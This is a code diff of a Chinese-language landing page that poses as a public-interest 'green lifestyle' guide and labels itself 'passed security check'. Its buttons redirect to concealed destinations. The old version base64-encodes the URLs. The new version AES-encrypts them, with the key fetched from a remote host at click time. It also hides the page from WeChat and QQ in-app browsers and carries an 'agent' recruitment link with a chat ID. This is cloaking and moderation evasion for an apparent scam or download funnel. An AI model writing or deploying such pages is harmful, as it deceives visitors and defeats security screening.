@@ -1,185 +1,83 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8">
-  <title>加载中……</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    :root {
-      --green: #4caf50;
-      --dark-green: #2e7d32;
-      --light-green: #f1f8f4;
-      --gray: #666;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>*已通过安全检测*</title>
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      height: 100%;
-      background-color: var(--light-green);
-      font-family: "Segoe UI", "Helvetica Neue", sans-serif;
-      color: var(--dark-green);
-    }
-
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      align-items: center;
-      text-align: center;
-      padding: 2vh 1em;
-    }
-
-    header {
-      width: 100%;
-      max-width: 400px;
-      background: linear-gradient(135deg, #e8f5e9, #ffffff);
-      border-radius: 16px;
-      box-shadow: 0 4px 12px rgba(76, 175, 80, 0.1);
-      padding: 1.5em 1em;
-    }
-
-    header h1 {
-      font-size: 1.8em;
-      font-weight: 600;
-      margin-bottom: 0.5em;
-      color: var(--dark-green);
-    }
-
-    header p {
-      font-size: 0.95em;
-      color: var(--gray);
-      line-height: 1.4em;
-    }
-
-    .marquee {
-      width: 100%;
-      overflow: hidden;
-      margin: 1vh 0 1.5vh;
-    }
-
-    .marquee-track {
-      display: flex;
-      width: max-content;
-      animation: marquee 25s linear infinite;
-    }
-
-    .marquee-item {
-      padding-right: 4rem;
-      white-space: nowrap;
-      font-size: 0.56em;
-      color: #388e3c;
-    }
-
-    @keyframes marquee {
-      0% {
-        transform: translateX(0%);
-      }
-      100% {
-        transform: translateX(-50%);
-      }
-    }
-
-    .menu {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      gap: 1em;
-      width: 100%;
-      max-width: 300px;
-      margin-top: 1vh;
-    }
-
-    /* ✅ 调整震动频率为3秒，幅度不变 */
-    @keyframes vibrate {
-      0%   { transform: translateX(0); }
-      10%  { transform: translateX(-3px); }
-      20%  { transform: translateX(3px); }
-      30%  { transform: translateX(-2px); }
-      40%  { transform: translateX(2px); }
-      50%  { transform: translateX(-1px); }
-      60%  { transform: translateX(1px); }
-      70%  { transform: translateX(-1px); }
-      80%  { transform: translateX(1px); }
-      90%  { transform: translateX(-0.5px); }
-      100% { transform: translateX(0); }
-    }
-
-    .menu button {
-      background-color: var(--green);
-      color: white;
-      border: none;
-      padding: 1em;
-      font-size: 1.1em;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-      animation: vibrate 3s infinite; /* ✅ 震动频率调低为3秒 */
-    }
-
-    .menu button:hover {
-      background-color: #388e3c;
-    }
-
-    footer {
-      font-size: 11px;
-      color: #888;
-      padding-bottom: 1.5vh;
-    }
-  </style>
+<!-- 原版-->
+<style>
+:root{--green:#4caf50;--dark-green:#2e7d32;--light-green:#f1f8f4;--gray:#666;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{height:100%;background:var(--light-green);font-family:"Segoe UI","Helvetica Neue",sans-serif;color:var(--dark-green);}
+body{display:flex;flex-direction:column;justify-content:space-between;align-items:center;text-align:center;padding:2vh 1em;}
+header{width:100%;max-width:400px;background:linear-gradient(135deg,#e8f5e9,#fff);border-radius:16px;box-shadow:0 4px 12px rgba(76,175,80,.1);padding:1.5em 1em;}
+header h1{font-size:1.8em;font-weight:600;margin-bottom:.5em;}
+header p{font-size:.95em;color:var(--gray);line-height:1.4em;}
+.marquee{width:100%;overflow:hidden;margin:1vh 0 1.5vh;}
+.marquee-track{display:flex;width:max-content;animation:marquee 25s linear infinite;}
+.marquee-item{padding-right:4rem;white-space:nowrap;font-size:.6em;color:#388e3c;}
+@keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+.menu{flex:1;display:flex;flex-direction:column;justify-content:center;gap:1em;width:100%;max-width:300px;margin-top:1vh;}
+@keyframes vibrate{0%{transform:translateX(0)}10%{transform:translateX(-3px)}20%{transform:translateX(3px)}30%{transform:translateX(-2px)}40%{transform:translateX(2px)}50%{transform:translateX(-1px)}60%{transform:translateX(1px)}70%{transform:translateX(-1px)}80%{transform:translateX(1px)}90%{transform:translateX(-.5px)}100%{transform:translateX(0)}}
+.menu button{background:var(--green);color:#fff;border:none;padding:1em;font-size:1.1em;border-radius:8px;cursor:pointer;animation:vibrate 3s infinite;}
+.menu button:hover{background:#388e3c;}
+footer{font-size:11px;color:#888;padding-bottom:1.5vh;}
+#block-hint{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:none;justify-content:center;align-items:center;font-size:16px;z-index:9999;padding:20px;text-align:center;}
+</style>
 </head>
 <body>
 
-  <header>
-    <h1>＊已通过安全检测＊</h1>
-    <p>打开页面如遇提示，点继续即可</p>
-  </header>
+<div id="block-hint">请使用手机浏览器打开本页面</div>
 
-  <div class="marquee">
-    <div class="marquee-track">
-      <div class="marquee-item">
-        🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行，利己利人 · 🥦 多吃蔬果少油盐 · 🌿 回归自然，守护生态 · 🛏️ 保证睡眠早作息 · 🌤️ 每天晒太阳20分钟 · 💧 多喝温水，少饮料 · 🌍 你就是绿色生活的践行者！
-      </div>
-      <div class="marquee-item">
-        🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行，利己利人 · 🥦 多吃蔬果少油盐 · 🌿 回归自然，守护生态 · 🛏️ 保证睡眠早作息 · 🌤️ 每天晒太阳20分钟 · 💧 多喝温水，少饮料 · 🌍 你就是绿色生活的践行者！
-      </div>
-    </div>
+<header>
+  <h1>*已通过安全检测*</h1>
+  <p>打开页面如遇提示→点继续即可</p>
+</header>
+
+<div class="marquee">
+  <div class="marquee-track">
+    <div class="marquee-item">🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行 · 🥦 多吃蔬果少油盐 · 🌿 回归自然 · 💧 多喝温水 · 🌍 你就是绿色生活的践行者！</div>
+    <div class="marquee-item">🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行 · 🥦 多吃蔬果少油盐 · 🌿 回归自然 · 💧 多喝温水 · 🌍 你就是绿色生活的践行者！</div>
   </div>
+</div>
 
-  <div class="menu">
-    <button onclick="jump('btn1')">🌱 幸福指南入口→点这里</button>
-    <button onclick="jump('btn2')">🚲 快乐指南入口→点这里</button>
-    <button onclick="jump('btn3')">🧘 养生指南入口→点这里</button>
-    <button onclick="jump('btn4')">💰代理➕旺商聊<p> 🆔105818024 <p>没有★旺商聊★→点这里</button>
-  </div>
+<div class="menu">
+  <button onclick="jump('btn1')">🌱 幸福指南入口→点这里</button>
+  <button onclick="jump('btn2')">🚲 快乐指南入口→点这里</button>
+  <button onclick="jump('btn3')">🧘 养生指南入口→点这里</button>
+  <button onclick="jump('btn4')">💰代理➕旺商聊<p>🆔105818024<p>没有★旺商聊★→点这里</button>
+</div>
 
-  <footer>本站为公益绿色导航页，内容来自公开资料整理</footer>
+<footer>本站为公益绿色导航页，内容来自公开资料整理</footer>
 
-  <script>
-    // ✅
-    const links = {
-      btn1: "aHR0cHM6Ly9kejA4MTgueG4tLWh3dHcwYjkyNmI4bmEuY29tL2FwaXgvZGwvZGR0ZXN0L2lkLzI0MDM3MjYzNy9wYWdlLzguaHRtbA==", // 示例地址1
-      btn2: "aHR0cHM6Ly9kejA4MTgueG4tLWh3dHcwYjkyNmI4bmEuY29tL2FwaXgvZGwvZGR0ZXN0L2lkLzI0MDM3MjYzNy9wYWdlLzguaHRtbA==", // 示例地址2
-      btn3: "aHR0cHM6Ly9kejA4MTgueG4tLWh3dHcwYjkyNmI4bmEuY29tL2FwaXgvZGwvZGR0ZXN0L2lkLzI0MDM3MjYzNy9wYWdlLzguaHRtbA==", // 示例地址3
-      btn4: "aHR0cHM6Ly93d3RhbGsuY29t" // 示例地址4
-    };
+<!-- CryptoJS -->
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script>
+/* ---------- 必填配置 ---------- */
+const KEY_API = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";   // ← 
+const encrypted = {                                       // ← 四段菜单导航
+  btn1: "U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn2: "U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn3: "U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn4: "U2FsdGVkX18OLSZJfPhNr4l29h+qbn4EHubyR3adfWmtHO2kwG2pIQ95EodL2vyJ"
+};
 
-    function jump(buttonId) {
-      try {
-        const base64Url = links[buttonId];
-        const decoded = atob(base64Url);
-        window.location.href = decoded;
-      } catch (e) {
-        alert("失败，请稍后再试。");
-        console.error(e);
-      }
-    }
-  </script>
+/* ---------- 导航---------- */
+async function jump(id){
+  try{
+    const key = await fetch(KEY_API+"?t="+Date.now()).then(r=>r.text());   // 统一
+    const url = CryptoJS.AES.decrypt(encrypted[id], key).toString(CryptoJS.enc.Utf8);
+    if(url.startsWith("http")) location.href = url;
+    else alert("打开失败，请稍后再试");
+  }catch(e){ alert("网络异常，请检查连接"); }
+}
 
+/* ---------- 提示---------- */
+(function(){
+  if(/micromessenger|qq\//i.test(navigator.userAgent))
+    document.getElementById("block-hint").style.display="flex";
+})();
+</script>
 </body>
 </html>
